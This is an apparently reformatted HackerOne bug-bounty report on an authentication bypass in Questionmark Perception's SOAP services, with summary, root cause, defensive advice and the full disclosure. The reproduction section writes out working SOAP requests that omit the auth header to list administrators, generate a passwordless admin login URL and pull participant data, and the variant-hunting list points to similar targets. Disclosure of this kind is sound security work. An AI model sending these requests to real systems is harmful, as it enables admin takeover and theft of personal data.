# Unauthorized Admin Access via SOAP Header Bypass in Questionmark Perception

## Metadata
- **Source:** HackerOne
- **Report:** 1026146 | https://hackerone.com/reports/1026146
- **Submitted:** 2020-11-04
- **Reporter:** qdoan95
- **Program:** Questionmark Perception
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** Missing Access Control, Authentication Bypass, Insecure Direct Object References, Information Disclosure, SOAP Header Validation Failure
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Questionmark Perception system fails to validate SOAP authentication headers, allowing unauthenticated attackers to enumerate administrators and generate passwordless login URLs. By removing SOAP header validation, attackers can bypass authentication entirely and gain full administrator access to the system, including access to sensitive participant data.

## Attack scenario
1. Attacker discovers the publicly accessible WSDL description at the web services endpoint
2. Attacker crafts a GetAdministratorList SOAP request without authentication headers
3. System returns complete administrator details including usernames, emails, and IDs due to missing access control
4. Attacker uses GetAccessAdministrator method with harvested administrator name to generate passwordless login URL
5. System returns a time-bound magic link enabling authentication without password validation
6. Attacker accesses the login URL and gains full administrator privileges to view/modify assessments, results, and participant data

## Root cause
The SOAP web service implementation relies solely on SOAP header presence for authentication rather than validating header contents. When headers are omitted, the service fails to enforce access control and processes authenticated-only methods as if the request were authorized. Additionally, the GetAccessAdministrator method generates time-limited passwordless access tokens without verifying the requestor's identity.

## Attacker mindset
An attacker would recognize that WSDL descriptions expose all available methods and their signatures. By experimenting with header manipulation, they discover that the system treats missing headers as implicit authorization rather than denying access. The attacker realizes they can enumerate sensitive data (admin lists) and generate legitimate-looking authentication tokens to impersonate administrators.

## Defensive takeaways
- Implement robust SOAP header validation—reject requests without required authentication headers rather than treating absence as authorization
- Enforce authentication and authorization checks for every SOAP method invocation, not just at entry points
- Restrict WSDL visibility to authenticated users only or completely disable service description publication
- Implement mutual authentication using WS-Security standards (signatures, encryption) rather than simple header checks
- Generate passwordless tokens only in response to authenticated requests from known administrators
- Implement rate limiting and anomaly detection on token generation methods
- Audit and log all SOAP method calls, particularly administrative operations
- Use time-based tokens with short expiration windows and bind tokens to IP addresses or sessions

## Variant hunting
Check for similar SOAP/XML-RPC services where header validation is optional or implicit
Test other Questionmark products (Questionmark OnDemand, Questionmark Enterprise) for identical SOAP bypass patterns
Hunt for other methods in the same WSDL that may lack authentication (GetParticipantList, GetAssessmentList, etc.)
Test whether other authentication schemes (API keys, OAuth tokens) have similar bypass mechanisms
Investigate if request signing/checksums can be forged or omitted entirely
Check if time-based token validation (EXPIRY field) is properly enforced or can be manipulated

## MITRE ATT&CK
- T1190
- T1589
- T1592
- T1566
- T1199
- T1078
- T1133
- T1556

## Notes
This vulnerability demonstrates a classic authentication bypass through improper trust assumptions. The system developers assumed that removing security headers would be immediately caught by clients, but instead created an implicit authorization model. The magic link/passwordless access feature, while potentially legitimate for admin account recovery, becomes a critical vulnerability when the preceding authorization checks fail. The WSDL exposure compounds the issue by providing complete attack documentation.

## Full report
<details><summary>Expand</summary>

**Summary:**
Due to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.

**Description:**
By using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.

## Step-by-step Reproduction Instructions
- Visit https://██████/█████████ to get all the Questionmark Web Integration Services' description.
████

- The method **GetAdministratorList** returns a list giving the full details of all the administrators in the database, as described in https://███████/███?████

████████

- Issuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:

```
POST /███ HTTP/1.1
Host: ████
Content-Type: text/xml; charset=utf-8
Content-Length: 328
SOAPAction: "http://questionmark.com/QMWISe/GetAdministratorList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAdministratorList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```
- The response shows us a list giving the full details of all the administrators in the database, included `Administrator_ID`, `Administrator_Name`, `Email`,...

█████

- The method **GetAccessAdministrator** processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.

```
POST /███████ HTTP/1.1
Host: ██████████
Content-Type: text/xml; charset=utf-8
Content-Length: 416
SOAPAction: "http://questionmark.com/QMWISe/GetAccessAdministrator"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAccessAdministrator xmlns="http://questionmark.com/QMWISe/">
      <Administrator_Name>au_eliut</Administrator_Name>
    </GetAccessAdministrator>
  </soap:Body>
</soap:Envelope>
```
- The response gives us a link to login without using a password.

```
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: 0
X-AspNet-Version: 2.0.50727
Strict-Transport-Security: max-age=63072000;includeSubDomains;preload
Date: Wed, 04 Nov 2020 18:18:46 GMT
Content-Length: 565
Set-Cookie: BIGipServer██████████████ path=/; Httponly; Secure

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>

```
██████████
- Using the link above: `https://██████████/████████` to login as admin.

████████

## Suggested Mitigation/Remediation Actions
- Remove the service description at https://██████/█████████
- Re-configure the system, to deny all the request without the SOAP "Trust" header.

## Impact

Incorrect access restriction to the authorized interface of the site leads to information leakage. [As Questionmark describes,](https://support.questionmark.com/content/web-services) an admin can view all fields of the questions, the results, and personal information of the participants.

For example, issuing the request below to get all the participants' information such as username, password,...

```
POST /██████ HTTP/1.1
Host: ███████
Content-Type: text/xml; charset=utf-8
Content-Length: 326
SOAPAction: "http://questionmark.com/QMWISe/GetParticipantList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetParticipantList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```

█████

</details>

---
*Analysed by Claude on 2026-05-24*
